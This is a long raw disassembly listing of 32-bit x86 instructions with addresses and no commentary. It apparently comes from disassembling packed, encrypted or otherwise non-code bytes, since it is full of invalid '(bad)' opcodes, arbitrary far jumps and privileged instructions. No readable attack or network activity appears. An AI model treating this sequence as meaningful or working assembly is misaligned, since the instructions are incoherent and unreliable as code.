  4031b1:	add    esi,DWORD PTR [edx-0x25b393d]
  4031b7:	push   esi
  4031b8:	xor    eax,0x2200dc52
  4031bd:	test   al,ch
  4031bf:	(bad)  
  4031c0:	adc    dl,BYTE PTR [esi+0x2750d55c]
  4031c6:	es pop esp
  4031c8:	pop    es
  4031c9:	xchg   esp,eax
  4031ca:	repnz mov BYTE PTR [eax+0x5c0e7212],dl
  4031d1:	stos   DWORD PTR es:[edi],eax
  4031d2:	sbb    al,0x4b
  4031d4:	add    DWORD PTR [eax-0x68],edx
  4031d7:	xor    ch,dh
  4031d9:	pop    edi
  4031da:	jg     0x4031f9
  4031dc:	rcr    BYTE PTR [ebp-0x2f9d5576],0xcf
  4031e3:	mov    ah,0x16
  4031e5:	push   cs
  4031e6:	push   ds
  4031e7:	jecxz  0x403195
  4031e9:	cmp    al,0x43
  4031eb:	sar    DWORD PTR [ecx],cl
  4031ed:	inc    edx
  4031ee:	adc    eax,0xa9567c36
  4031f3:	rcr    ch,1
  4031f5:	imul   ebp,DWORD PTR [eax+0x6bc0a79f],0x57
  4031fc:	sbb    BYTE PTR [eax+ebp*8],al
  4031ff:	inc    ecx
  403200:	das    
  403201:	xor    edi,0x856a7be3
  403207:	inc    esp
  403208:	mov    edi,0x4a87bb3a
  40320d:	(bad)  
  40320f:	pop    ecx
  403210:	repnz inc eax
  403212:	repnz ror BYTE PTR [eax-0x60],1
  403216:	scas   eax,DWORD PTR es:[edi]
  403217:	pop    ds
  403218:	inc    eax
  403219:	fstp   TBYTE PTR [ebx+esi*4]
  40321c:	jge    0x403245
  40321e:	mov    ch,0x5b
  403220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403221:	sar    BYTE PTR [ebx+0x35],1
  403224:	les    ebx,FWORD PTR [eax+0x10]
  403227:	xchg   edx,eax
  403228:	(bad)  
  403229:	daa    
  40322a:	cwde   
  40322b:	push   ss
  40322c:	adc    ebx,DWORD PTR [ecx-0x5e262be8]
  403232:	aam    0xce
  403234:	daa    
  403235:	mov    al,ds:0x85a9d555
  40323a:	sub    DWORD PTR ds:0xac09ac26,edi
  403240:	aaa    
  403241:	inc    esi
  403242:	retf   
  403243:	inc    ecx
  403244:	pushf  
  403245:	adc    dl,BYTE PTR [ecx-0x605ad52]
  40324b:	mov    bl,0x87
  40324d:	add    BYTE PTR [edi-0x43c46ed5],dl
  403253:	cmovp  esp,DWORD PTR [ecx+0x2e0c7e1b]
  40325a:	aam    0x2c
  40325c:	mov    DWORD PTR [edx],edi
  40325e:	jmp    0xa44e:0xbead5ce7
  403265:	cmp    bh,BYTE PTR [ecx+0x35]
  403268:	inc    ecx
  403269:	add    esi,DWORD PTR [esi+0xc]
  40326c:	sbb    al,dh
  40326e:	cmp    ebx,eax
  403270:	nop
  403271:	add    dl,bh
  403273:	cmp    edi,ebx
  403275:	fidivr WORD PTR ds:0xb757cac3
  40327b:	mov    esp,0x3db93a2a
  403280:	js     0x4032ff
  403282:	jg     0x40323a
  403284:	jbe    0x4032ca
  403286:	rcr    BYTE PTR [esi-0x26],0xa3
  40328a:	sti    
  40328b:	push   edx
  40328c:	test   BYTE PTR [eax],bl
  40328e:	clc    
  40328f:	pop    esi
  403290:	stos   BYTE PTR es:[edi],al
  403291:	rol    BYTE PTR [esi-0x563cfa0f],0x18
  403298:	mov    esi,0x566ac43c
  40329d:	adc    BYTE PTR [ebx+0x198be962],dh
  4032a3:	or     DWORD PTR [ebp+0x24dd407e],edx
  4032a9:	dec    esi
  4032aa:	out    dx,eax
  4032ab:	sub    BYTE PTR [edx-0x785cb533],dl
  4032b1:	fwait
  4032b2:	adc    DWORD PTR [edx-0x13601afd],ebx
  4032b8:	pushf  
  4032b9:	add    BYTE PTR [edi+edi*4-0x5ab48522],0xf8
  4032c1:	add    edx,ebp
  4032c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032c4:	inc    DWORD PTR [edi]
  4032c6:	lock std 
  4032c8:	sahf   
  4032c9:	aad    0xad
  4032cb:	inc    esp
  4032cc:	xor    al,0x51
  4032ce:	pop    esi
  4032cf:	sbb    DWORD PTR [ebp-0x6875d908],eax
  4032d5:	das    
  4032d6:	push   ss
  4032d7:	pusha  
  4032d8:	fwait
  4032d9:	mov    al,ds:0x258fd424
  4032de:	hlt    
  4032df:	aaa    
  4032e0:	aad    0xd
  4032e2:	cmp    al,0x85
  4032e4:	lods   al,BYTE PTR ds:[esi]
  4032e5:	push   ds
  4032e6:	and    DWORD PTR [ebx-0x2a],esi
  4032e9:	aaa    
  4032ea:	pop    edx
  4032eb:	dec    ebx
  4032ec:	mov    ch,0x25
  4032ee:	(bad)  
  4032ef:	jmp    0x40327f
  4032f1:	pop    ss
  4032f2:	inc    edi
  4032f3:	add    BYTE PTR [esi-0x68d540e2],dl
  4032f9:	jno    0x4032df
  4032fb:	xor    DWORD PTR [ecx],edi
  4032fd:	lods   al,BYTE PTR ds:[esi]
  4032fe:	adc    al,0x31
  403300:	push   edi
  403301:	cwde   
  403302:	test   DWORD PTR [edi+eiz*2],ecx
  403305:	jb     0x4032e9
  403307:	ret    
  403308:	sbb    eax,0xc2b7a004
  40330d:	sub    al,0x57
  40330f:	and    al,0xba
  403311:	cwde   
  403312:	inc    ecx
  403313:	fsub   DWORD PTR [edx+0x6b]
  403316:	pop    esi
  403317:	mov    al,0x62
  403319:	cld    
  40331a:	xor    al,0xd8
  40331c:	in     eax,0xb3
  40331e:	cwde   
  40331f:	mov    esi,0x70332213
  403324:	mov    dh,0x22
  403326:	ret    
  403327:	fld    TBYTE PTR ds:0x7f3a7ba2
  40332d:	aad    0xb7
  40332f:	push   0xd564549d
  403334:	sub    eax,0x19ff153a
  403339:	mov    ah,0xc3
  40333b:	pop    eax
  40333c:	pop    ebx
  40333d:	rol    ebp,0xff
  403340:	fmul   DWORD PTR [ebx-0x4f]
  403343:	clc    
  403344:	stos   DWORD PTR es:[edi],eax
  403345:	fldcw  WORD PTR [edx]
  403347:	sbb    DWORD PTR [edx+esi*2+0x64],0x55
  40334c:	or     ebp,ebx
  40334e:	scas   eax,DWORD PTR es:[edi]
  40334f:	scas   eax,DWORD PTR es:[edi]
  403350:	dec    ebp
  403351:	loope  0x403314
  403353:	fsub   st,st(7)
  403355:	gs jmp 0x403383
  403358:	and    eax,0x4a33af11
  40335d:	adc    BYTE PTR [ebx+0x6d8bebea],ah
  403363:	push   ecx
  403364:	and    ch,BYTE PTR [esi-0x5c]
  403367:	aad    0x6d
  403369:	xchg   ecx,eax
  40336a:	adc    edx,DWORD PTR [esp+ecx*8+0x1]
  40336e:	in     al,0x73
  403370:	add    DWORD PTR [edx],0xcc79e0e
  403376:	mov    bh,0xcd
  403378:	mov    dl,0x61
  40337a:	jge    0x4033a4
  40337c:	push   0xffffffe4
  40337e:	push   eax
  40337f:	and    DWORD PTR [ebp-0x32],ebp
  403382:	sbb    DWORD PTR [esi+0x2cf6266f],esi
  403388:	imul   ecx,DWORD PTR ds:0x3c2247b0,0x54
  40338f:	div    BYTE PTR [edi-0x74]
  403392:	leave  
  403393:	push   ecx
  403394:	push   ss
  403395:	mov    BYTE PTR [esi],ah
  403397:	mov    edx,0x7ca7d691
  40339c:	test   eax,0xd8dbc21a
  4033a1:	push   es
  4033a2:	std    
  4033a3:	pop    esi
  4033a4:	(bad)  
  4033a5:	into   
  4033a6:	in     eax,dx
  4033a7:	adc    ah,bl
  4033a9:	jno    0x40341f
  4033ab:	sbb    BYTE PTR [esi],al
  4033ad:	sub    DWORD PTR [edi+0x501c838f],esp
  4033b3:	pop    eax
  4033b4:	not    DWORD PTR [esi]
  4033b6:	mov    esp,0xc5a51096
  4033bb:	add    al,BYTE PTR [ebx+0x2d]
  4033be:	loopne 0x40340a
  4033c0:	(bad)  
  4033c1:	sar    ebp,1
  4033c3:	aad    0x48
  4033c5:	push   es
  4033c6:	or     eax,0x3953c898
  4033cb:	fsub   QWORD PTR [ecx]
  4033cd:	retf   
  4033ce:	pop    eax
  4033cf:	mov    ch,0xb0
  4033d1:	inc    edi
  4033d2:	aad    0x19
  4033d4:	mov    ebx,0x10e0c9ad
  4033d9:	inc    edx
  4033da:	test   BYTE PTR [esi-0x32078844],0x20
  4033e1:	ficom  DWORD PTR [esi+0x7e]
  4033e4:	or     DWORD PTR [eax+ebp*1-0x78],eax
  4033e8:	test   DWORD PTR es:[edx-0x63b673a8],0xf45781fe
  4033f3:	pop    ds
  4033f4:	add    BYTE PTR [ebp+0x71cf99da],bh
  4033fa:	pop    ebx
  4033fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033fc:	mov    ds:0x5d765cf6,eax
  403401:	aas    
  403402:	xchg   edx,ebx
  403404:	addr16 cwde 
  403406:	xor    bl,0x21
  403409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40340a:	aaa    
  40340b:	aaa    
  40340c:	jb     0x40341d
  40340e:	nop
  40340f:	stos   BYTE PTR es:[edi],al
  403410:	test   eax,0x64b7b75a
  403415:	pop    es
  403416:	jmp    0x403430
  403418:	sbb    BYTE PTR [edi],dl
  40341a:	call   0x7fc0:0xb0a54121
  403421:	into   
  403422:	push   es
  403423:	jnp    0x40349a
  403425:	hlt    
  403426:	dec    esp
  403427:	xchg   ebx,eax
  403428:	js     0x4033d4
  40342a:	ror    dh,cl
  40342c:	imul   ebp,DWORD PTR [ecx+ecx*8+0x77856b69],0xca9f4867
  403437:	jmp    0xc3870f9
  40343c:	in     eax,dx
  40343d:	pop    esi
  40343e:	in     al,0xc9
  403440:	jl     0x403427
  403442:	in     eax,0x4b
  403444:	stos   BYTE PTR es:[edi],al
  403445:	cs sub ah,cl
  403448:	mov    edx,0x12a277f0
  40344d:	pop    ds
  40344e:	sar    DWORD PTR [ebx],0x9d
  403451:	jle    0x40348f
  403453:	stc    
  403454:	and    eax,esi
  403456:	cmp    eax,0xad65ace3
  40345b:	push   ss
  40345c:	sub    eax,0x384cb999
  403461:	mov    edi,0xeacb202c
  403466:	idiv   BYTE PTR [edx]
  403468:	rol    DWORD PTR [eax],cl
  40346a:	and    esp,edx
  40346c:	dec    eax
  40346d:	xor    cl,bh
  40346f:	(bad)  
  403470:	xor    al,0xca
  403472:	push   esp
  403473:	call   FWORD PTR [esi+ecx*4-0x3e]
  403477:	push   es
  403478:	adc    ebx,DWORD PTR [esi-0x361bc3ea]
  40347e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40347f:	add    ebp,ecx
  403481:	pop    esi
  403482:	mov    dl,BYTE PTR [ecx+edx*8]
  403485:	retf   0xad55
  403488:	lods   eax,DWORD PTR ds:[esi]
  403489:	imul   esi,DWORD PTR [eax],0x41c2bfb4
  40348f:	das    
  403490:	mov    ecx,0x65979e85
  403495:	dec    esp
  403496:	dec    ecx
  403497:	sbb    esp,DWORD PTR [edx-0x3e]
  40349a:	jecxz  0x4034bd
  40349c:	inc    ebx
  40349d:	cmp    al,0x64
  40349f:	es jae 0x4034fb
  4034a2:	cmp    DWORD PTR [esi+ecx*8-0xe],esp
  4034a6:	test   eax,0x4150ddd2
  4034ab:	in     al,dx
  4034ac:	scas   eax,DWORD PTR es:[edi]
  4034ad:	retf   0x9ef4
  4034b0:	add    DWORD PTR [edi],edi
  4034b2:	push   ebx
  4034b3:	mov    cs,WORD PTR ds:0x3b143f21
  4034b9:	loope  0x4034fd
  4034bb:	ficomp DWORD PTR [edx+0x5e]
  4034be:	add    eax,0xefb59603
  4034c3:	xchg   BYTE PTR [esp+ebx*2-0x186b2ba1],cl
  4034ca:	mov    eax,ds:0xf4b3e47
  4034cf:	cmp    eax,0xd6f627b6
  4034d4:	mov    ah,0x6d
  4034d6:	stos   BYTE PTR es:[edi],al
  4034d7:	sub    eax,0xe97e2f9e
  4034dc:	sub    DWORD PTR [ecx],ecx
  4034de:	xchg   ecx,eax
  4034df:	enter  0x8534,0x66
  4034e3:	test   BYTE PTR [edi+edi*2+0x20adee5],0xe8
  4034eb:	adc    DWORD PTR [edx],edx
  4034ed:	mov    ch,0x25
  4034ef:	cli    
  4034f0:	mov    eax,ds:0x1c873e3c
  4034f5:	call   0xd079:0x7ea573a8
  4034fc:	and    DWORD PTR [eax],0x8
  4034ff:	(bad)  
  403500:	push   edi
  403501:	cmp    BYTE PTR [esi],dl
  403503:	push   edi
  403504:	in     al,0xb3
  403506:	aam    0x99
  403508:	inc    esp
  403509:	dec    ebx
  40350a:	clc    
  40350b:	dec    edx
  40350c:	outs   dx,DWORD PTR ds:[esi]
  40350d:	loop   0x403519
  40350f:	out    0xef,al
  403511:	add    ch,dh
  403513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403514:	in     eax,0x94
  403516:	clc    
  403517:	dec    edx
  403518:	pusha  
  403519:	add    BYTE PTR [eax],dh
  40351b:	fnsave [ebx+0x3f]
  40351e:	retf   
  40351f:	icebp  
  403520:	mov    eax,0x65207842
  403525:	inc    edi
  403526:	icebp  
  403527:	jmp    DWORD PTR [eax+0x4b09ca48]
  40352d:	mov    dl,0xcd
  40352f:	repnz mov dl,0x2b
  403532:	inc    ebx
  403533:	xchg   DWORD PTR [ecx],esp
  403535:	jmp    0xa63e7c22
  40353a:	stc    
  40353b:	inc    ebp
  40353c:	mov    bl,0xb2
  40353e:	ins    DWORD PTR es:[edi],dx
  40353f:	inc    edi
  403540:	or     BYTE PTR [ebp-0x2b],cl
  403543:	cmp    eax,0x6a9c3452
  403548:	push   ss
  403549:	inc    edx
  40354a:	int    0xfa
  40354c:	dec    edx
  40354d:	sbb    BYTE PTR [edx+0x5d0fe5a2],al
  403553:	pop    ax
  403555:	imul   eax,DWORD PTR [ecx],0xffffffcf
  403558:	mov    ebx,0x9df5744b
  40355d:	scas   al,BYTE PTR es:[edi]
  40355e:	cmp    eax,0xceaf63e1
  403563:	sbb    BYTE PTR [edi-0x18],0x32
  403567:	pop    ebx
  403568:	sbb    BYTE PTR [ecx-0x4964c84c],ah
  40356e:	ins    DWORD PTR es:[edi],dx
  40356f:	jnp    0x40356e
  403571:	lea    ebp,[ebp+0x8]
  403574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403575:	jns    0x403506
  403577:	jnp    0x4035ac
  403579:	jmp    0xa16c:0xb3662321
  403580:	and    eax,DWORD PTR [eax]
  403582:	fs stos BYTE PTR es:[edi],al
  403584:	inc    edx
  403585:	ret    0x80e0
  403588:	scas   al,BYTE PTR es:[edi]
  403589:	aas    
  40358a:	cmp    eax,0x21d219e6
  40358f:	stos   DWORD PTR es:[edi],eax
  403590:	in     eax,0xb1
  403592:	pop    edi
  403593:	cli    
  403594:	in     al,dx
  403595:	(bad)  
  403596:	fistp  WORD PTR [ecx]
  403598:	cld    
  403599:	pop    ds
  40359a:	sub    BYTE PTR [esi-0x1e2edaac],al
  4035a0:	pusha  
  4035a1:	loop   0x4035d0
  4035a3:	call   FWORD PTR [eax-0x480b175b]
  4035a9:	das    
  4035aa:	pop    esp
  4035ab:	xchg   ebx,eax
  4035ac:	pop    ecx
  4035ad:	xchg   ebx,eax
  4035ae:	cmp    BYTE PTR [esi-0x34513f14],0xfd
  4035b5:	sbb    BYTE PTR [eax+eax*2],ah
  4035b8:	inc    ebp
  4035b9:	mov    al,ds:0x15e472cd
  4035be:	cmp    ah,BYTE PTR [eax-0xf]
  4035c1:	mov    BYTE PTR [eax+0x789d12f5],al
  4035c7:	jge    0x40357e
  4035c9:	mov    eax,ds:0xf3028ca3
  4035ce:	jmp    0x40357a
  4035d0:	add    eax,0x8b44c225
  4035d5:	cli    
  4035d6:	cwde   
  4035d7:	mov    dh,BYTE PTR [edi]
  4035d9:	fcmovnbe st,st(6)
  4035db:	or     eax,0x32467ef9
  4035e0:	push   DWORD PTR [ebx]
  4035e2:	pop    edi
  4035e3:	push   esi
  4035e4:	or     eax,0x45a68b0
  4035e9:	mov    ds:0xadf19b8a,eax
  4035ee:	inc    DWORD PTR [eax+eax*4-0xb]
  4035f2:	outs   dx,DWORD PTR ds:[esi]
  4035f3:	push   0x7a
  4035f5:	pop    edx
  4035f6:	adc    DWORD PTR [ecx-0x4683d845],esi
  4035fc:	push   ecx
  4035fd:	pop    ebx
  4035fe:	retf   0x4fb
  403601:	pop    esi
  403602:	test   eax,0x3693a6e6
  403607:	imul   edi,ebp,0x7c
  40360a:	cli    
  40360b:	rcl    BYTE PTR [ecx-0x431b998b],cl
  403611:	mov    ah,BYTE PTR [ebp+0x2d]
  403614:	push   ebx
  403615:	mov    al,ds:0x64d904a4
  40361a:	fnstenv [edx+0x3b460c27]
  403620:	add    BYTE PTR [esi+0x18246390],bl
  403626:	ins    DWORD PTR es:[edi],dx
  403627:	fisttp WORD PTR [esi+0xc4fad31]
  40362d:	(bad)  
  40362e:	sti    
  40362f:	lds    edx,FWORD PTR [ebp+0x7cfe26f]
  403635:	ins    DWORD PTR es:[edi],dx
  403636:	dec    esp
  403637:	sahf   
  403638:	push   es
  403639:	pop    es
  40363a:	mov    edx,0x314d0051
  40363f:	aam    0x5a
  403641:	fsubr  QWORD PTR [edx+0x61]
  403644:	jb     0x403690
  403646:	mov    dl,0x95
  403648:	push   eax
  403649:	loop   0x403695
  40364b:	inc    edx
  40364c:	xor    esp,DWORD PTR [esi]
  40364e:	and    DWORD PTR [edi+eax*2],ecx
  403651:	jmp    0xadddfc2e
  403656:	or     ah,BYTE PTR [edi-0x4e]
  403659:	mov    dh,0x6a
  40365b:	jb     0x403634
  40365d:	cmp    edi,ecx
  40365f:	inc    eax
  403660:	scas   eax,DWORD PTR es:[edi]
  403661:	test   BYTE PTR [ebp-0x18],cl
  403664:	add    BYTE PTR [eax],cl
  403666:	jo     0x403636
  403668:	sub    ah,ah
  40366a:	cwde   
  40366b:	mov    ch,0x7c
  40366d:	cmp    BYTE PTR [eax+0x6ffc7e08],bl
  403673:	inc    esp
  403674:	fwait
  403675:	jno    0x403636
  403677:	push   eax
  403678:	mov    ?,WORD PTR [edi+0x6f]
  40367b:	inc    edx
  40367c:	sbb    al,BYTE PTR [ebx-0x5c]
  40367f:	push   edi
  403680:	inc    esi
  403681:	xchg   ebx,eax
  403682:	push   edi
  403683:	loope  0x4036bf
  403685:	jbe    0x40365d
  403687:	jne    0x403655
  403689:	and    al,0xa6
  40368c:	retf   0xb7fe
  40368f:	push   edi
  403690:	test   DWORD PTR [ecx+0x427f936f],eax
  403696:	add    ah,BYTE PTR [ebp+0x135d3b7c]
  40369c:	mov    ah,0xa
  40369e:	mov    ch,bh
  4036a0:	ins    DWORD PTR es:[edi],dx
  4036a1:	mov    dh,0xeb
  4036a3:	loopne 0x4036ac
  4036a5:	mov    BYTE PTR [edi-0x6a],dh
  4036a8:	into   
  4036a9:	cmp    BYTE PTR [eax+ebp*8],bl
  4036ac:	mov    esp,?
  4036ae:	jne    0x4036e6
  4036b0:	or     eax,0xc5728697
  4036b5:	retf   
  4036b6:	sbb    DWORD PTR [edx-0x57],0xffffffb3
  4036ba:	push   ebx
  4036bb:	jle    0x40367d
  4036bd:	scas   eax,DWORD PTR es:[edi]
  4036be:	xor    eax,0x7806ce3
  4036c3:	loope  0x4036cc
  4036c5:	mov    al,0xcc
  4036c7:	arpl   WORD PTR [esi-0x6ec8203f],di
  4036cd:	aas    
  4036ce:	inc    edx
  4036cf:	pop    ebx
  4036d0:	loop   0x403715
  4036d2:	outs   dx,BYTE PTR ds:[esi]
  4036d3:	pop    ebx
  4036d4:	mov    bl,0xc2
  4036d6:	mov    ecx,0xf18c6a91
  4036db:	pop    ecx
  4036dc:	repnz xlat BYTE PTR ds:[ebx]
  4036de:	push   0x56af05e1
  4036e3:	and    DWORD PTR [edx+eax*2],eax
  4036e6:	retf   0xfdc1
  4036e9:	xor    DWORD PTR [edx+0x61],0xe1c6e4b2
  4036f0:	jecxz  0x40369b
  4036f2:	jo     0x403689
  4036f4:	xor    DWORD PTR [ebx+0x5e7251a0],ebx
  4036fa:	xchg   edi,eax
  4036fb:	popw   es
  4036fd:	shl    BYTE PTR [edx+0x5b],0xfe
  403701:	push   cs
  403702:	xlat   BYTE PTR ds:[ebx]
  403703:	cmp    DWORD PTR [edx-0x5f],ecx
  403706:	and    esp,edx
  403708:	inc    BYTE PTR [eax+edi*8+0x17]
  40370c:	sbb    BYTE PTR [edi],0x8
  40370f:	js     0x4036f4
  403711:	sbb    BYTE PTR [eax-0x2b],ah
  403714:	jnp    0x40374c
  403716:	js     0x4036e6
  403718:	xchg   esi,eax
  403719:	arpl   WORD PTR [edx+0x7bf8f7e7],sp
  40371f:	in     eax,dx
  403720:	or     edi,ebp
  403722:	out    dx,eax
  403723:	call   0x3a72:0x7615948f
  40372a:	aas    
  40372b:	clc    
  40372c:	inc    edx
  40372d:	fbld   TBYTE PTR [ebx+0x78]
  403730:	adc    ebx,DWORD PTR [eax-0x39]
  403733:	test   al,0x6a
  403735:	mov    ebp,0xf188a7b2
  40373a:	ret    
  40373b:	data16 fcom QWORD PTR [ecx-0x3c65f776]
  403742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403743:	mov    al,ds:0x416661ff
  403748:	jge    0x4036ca
  40374a:	cwde   
  40374b:	retf   
  40374c:	push   ecx
  40374d:	xchg   ebx,eax
  40374e:	dec    ebp
  40374f:	out    0xb1,eax
  403751:	imul   ebp,DWORD PTR gs:[ebx-0x6f9cddf0],0xb3be25db
  40375c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40375d:	lea    edx,[esi+0x20]
  403760:	shr    BYTE PTR [esi-0x77],1
  403763:	xchg   DWORD PTR [edx-0x7b],ebp
  403766:	scas   al,BYTE PTR es:[edi]
  403767:	out    0xe0,eax
  403769:	sbb    ebp,DWORD PTR [edi-0x68]
  40376c:	(bad)  
  40376d:	sbb    ch,BYTE PTR [eax-0x56]
  403770:	loop   0x4037e1
  403772:	inc    ecx
  403773:	pop    eax
  403774:	mov    dl,dl
  403776:	push   0x1b
  403778:	aam    0x17
  40377a:	js     0x40370d
  40377c:	ret    0x8c44
  40377f:	sar    BYTE PTR [ebx-0x28],cl
  403782:	js     0x40372a
  403784:	cmp    BYTE PTR [ebx+0x18],0xbe
  403788:	mov    ebx,0x4eeb3608
  40378d:	arpl   WORD PTR [ebp+0x4398ef7],si
  403793:	lea    esi,[eax+eiz*2+0x9adf9d7]
  40379a:	lods   al,BYTE PTR ds:[esi]
  40379b:	das    
  40379c:	add    eax,0x98fbf8e1
  4037a1:	out    0xf1,eax
  4037a3:	popw   es
  4037a5:	icebp  
  4037a6:	aad    0xd0
  4037a8:	sti    
  4037a9:	ins    BYTE PTR es:[edi],dx
  4037aa:	jnp    0x40373e
  4037ac:	ret    
  4037ad:	push   cs
  4037ae:	hlt    
  4037af:	push   esp
  4037b0:	dec    esp
  4037b1:	or     al,0x20
  4037b3:	aam    0x31
  4037b5:	dec    ebx
  4037b6:	cmp    ebp,DWORD PTR [eax]
  4037b8:	leave  
  4037b9:	ss inc edx
  4037bb:	push   0x208df81b
  4037c0:	popa   
  4037c1:	fadd   QWORD PTR [ebx+0x38]
  4037c4:	ins    DWORD PTR es:[edi],dx
  4037c5:	pop    ecx
  4037c6:	xchg   edx,eax
  4037c7:	sbb    ah,BYTE PTR [ebx-0x77]
  4037ca:	jmp    0xbe7c:0x315197e9
  4037d1:	aad    0x1a
  4037d3:	adc    BYTE PTR [ebp-0x1b87ad4f],al
  4037d9:	sbb    esp,edx
  4037db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037dc:	jp     0x4037d8
  4037de:	iret   
  4037df:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4037e1:	xchg   DWORD PTR [edx+eax*4],edx
  4037e4:	stos   DWORD PTR es:[edi],eax
  4037e5:	aas    
  4037e6:	lea    eax,[eax+esi*4+0x2]
  4037ea:	mov    WORD PTR [eax+edi*4+0x37],gs
  4037ee:	or     BYTE PTR [ebx+0xb],ah
  4037f1:	dec    esp
  4037f2:	jge    0x403799
  4037f4:	popf   
  4037f5:	xlat   BYTE PTR ds:[ebx]
  4037f6:	aaa    
  4037f7:	jmp    0xc5db7aba
  4037fc:	adc    BYTE PTR [ecx+0x32ded4c1],ah
  403802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403803:	scas   eax,DWORD PTR es:[edi]
  403804:	mov    esp,0xf7448345
  403809:	sub    BYTE PTR [ebx+ebx*1-0x600baf14],dh
  403810:	add    DWORD PTR [esi-0x56d642b0],esp
  403816:	fist   WORD PTR ds:0x87bc43d3
  40381c:	mov    DWORD PTR [ebx+0x20],esi
  40381f:	fwait
  403820:	outs   dx,DWORD PTR ds:[esi]
  403821:	sbb    BYTE PTR [eax-0x43],0xbd
  403825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403826:	adc    ah,bh
  403828:	adc    DWORD PTR [ebp+edi*8-0x7dc75e02],eax
  40382f:	mov    eax,ds:0x1637395a
  403834:	jp     0x403854
  403836:	scas   eax,DWORD PTR es:[edi]
  403837:	and    eax,0xe0ab8160
  40383c:	inc    esp
  40383d:	mov    ebp,0xa6fea780
  403842:	ins    BYTE PTR es:[edi],dx
  403843:	addr16 pop esp
  403845:	inc    eax
  403846:	fimul  DWORD PTR [eax-0x1684be5a]
  40384c:	int3   
  40384d:	rdtsc  
  40384f:	adc    esi,DWORD PTR [ebx-0x29e8f697]
  403855:	adc    BYTE PTR [ecx-0x234a8e40],dh
  40385b:	pop    esi
  40385c:	repnz push edx
  40385e:	pop    ebp
  40385f:	test   BYTE PTR [ebx-0x47],ch
  403862:	or     edx,DWORD PTR [edi-0x391d397a]
  403868:	aaa    
  403869:	arpl   si,ax
  40386b:	pop    ebp
  40386c:	fdivr  QWORD PTR [esi]
  40386e:	out    0x19,al
  403870:	fwait
  403871:	cmp    dl,BYTE PTR [ebx-0x7965e267]
  403877:	sub    al,0x94
  403879:	ins    DWORD PTR es:[edi],dx
  40387a:	out    dx,al
  40387b:	sbb    ebp,ebx
  40387d:	lods   eax,DWORD PTR ds:[esi]
  40387e:	repnz retf 
  403880:	out    dx,al
  403881:	stos   DWORD PTR es:[edi],eax
  403882:	mov    ah,0xc7
  403884:	push   ecx
  403885:	cdq    
  403886:	outs   dx,BYTE PTR ds:[esi]
  403887:	lock jge 0x403871
  40388a:	in     eax,0x49
  40388c:	dec    eax
  40388d:	fdiv   st(1),st
  40388f:	push   ds
  403890:	mov    al,ds:0x5dbe0674
  403895:	inc    ebx
  403896:	jne    0x403900
  403898:	push   esi
  403899:	or     esp,DWORD PTR ds:0xee2f0178
  40389f:	add    al,BYTE PTR [eax+0x4835eb19]
  4038a5:	in     eax,0xba
  4038a7:	push   ecx
  4038a8:	pop    ebp
  4038a9:	cmp    DWORD PTR [edi],ebx
  4038ab:	xchg   DWORD PTR [esi+0x46378d3a],ecx
  4038b1:	fstp   st(7)
  4038b3:	xor    DWORD PTR [edi],esp
  4038b5:	std    
  4038b6:	pop    edi
  4038b7:	sub    DWORD PTR [edx+ecx*4],ecx
  4038ba:	lahf   
  4038bb:	outs   dx,DWORD PTR ds:[esi]
  4038bc:	jmp    0xe1877aa3
  4038c1:	je     0x40389b
  4038c3:	jb     0x40393d
  4038c5:	repnz call 0x2950:0xfbbb0b78
  4038cd:	pop    ebp
  4038ce:	mov    ds:0x412f5aa8,al
  4038d3:	lock jmp 0x811ec24f
  4038d9:	fs dec ecx
  4038db:	and    eax,0xb9d5c2fc
  4038e0:	scas   al,BYTE PTR es:[edi]
  4038e1:	mov    cl,0xd1
  4038e3:	leave  
  4038e4:	sti    
  4038e5:	test   eax,0xd1c9a187
  4038ea:	daa    
  4038eb:	ins    DWORD PTR es:[edi],dx
  4038ec:	add    ah,BYTE PTR [edi]
  4038ee:	pop    esp
  4038ef:	and    DWORD PTR [eax+0x53],esi
  4038f2:	dec    esi
  4038f3:	fcomp  DWORD PTR [ebx]
  4038f5:	ror    BYTE PTR [ecx+0x52aa9000],cl
  4038fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038fc:	jmp    0x4038cb
  4038fe:	neg    DWORD PTR ds:0x15a21c7b
  403904:	inc    ecx
  403905:	pushf  
  403906:	packssdw mm7,QWORD PTR [esi+0x4b]
  40390a:	push   cs
  40390b:	add    BYTE PTR [eax-0x4ab579fd],bl
  403911:	js     0x40398a
  403913:	jmp    0xc4e5:0xe2a0e89d
  40391a:	stos   BYTE PTR es:[edi],al
  40391b:	(bad)
  40391e:	jne    0x4038dc
  403920:	pusha  
  403921:	mov    ds:0x2e94000c,eax
  403926:	xor    esi,DWORD PTR [esi+0x60]
  403929:	mov    ah,BYTE PTR [eax-0x2d126cf9]
  40392f:	sbb    eax,0x9190cf91
  403934:	inc    ebx
  403935:	xchg   ebp,eax
  403936:	in     al,0x7e
  403938:	stos   DWORD PTR es:[edi],eax
  403939:	(bad)  
  40393a:	imul   DWORD PTR [edi-0x27]
  40393d:	sbb    ecx,edx
  40393f:	push   edi
  403940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403941:	push   0xfb1614dd
  403946:	sbb    eax,0x72ff912e
  40394b:	popf   
  40394c:	in     al,dx
  40394d:	(bad)  
  40394e:	lahf   
  40394f:	cmp    al,0x51
  403951:	loop   0x403965
  403953:	dec    ecx
  403955:	cmp    eax,edi
  403957:	xor    BYTE PTR [edi],cl
  403959:	push   esi
  40395a:	push   ds
  40395b:	xor    dh,0x32
  40395e:	aam    0x5c
  403960:	in     al,dx
  403961:	cwde   
  403962:	outs   dx,DWORD PTR ds:[esi]
  403963:	retf   
  403964:	add    ecx,ecx
  403966:	je     0x403928
  403968:	push   ebx
  403969:	xchg   DWORD PTR [edx],eax
  40396b:	int3   
